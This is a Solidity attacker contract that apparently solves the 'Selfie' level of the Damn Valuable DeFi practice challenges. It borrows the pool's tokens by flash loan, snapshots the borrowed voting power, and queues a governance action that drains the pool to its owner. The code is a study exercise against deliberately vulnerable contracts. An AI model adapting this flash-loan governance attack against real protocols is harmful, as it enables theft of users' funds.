// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableTokenSnapshot.sol";
import "../SelfiePool.sol";

/**
 * @title AttackerC6
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC6 {
    address immutable owner;

    DamnValuableTokenSnapshot immutable dvt;
    SelfiePool immutable selfiePool;
    SimpleGovernance immutable governance;

    uint256 public actionId;

    constructor(address _dvt, address _selfiePool, address _governance) {
        owner = msg.sender;
        dvt = DamnValuableTokenSnapshot(_dvt);
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
    }

    function exploit() external {
        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
        actionId = governance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
    }

    function receiveTokens(address, uint256) external {
        require(msg.sender == address(selfiePool));
        dvt.snapshot();
        dvt.transfer(address(selfiePool), dvt.balanceOf(address(this)));
    }
}
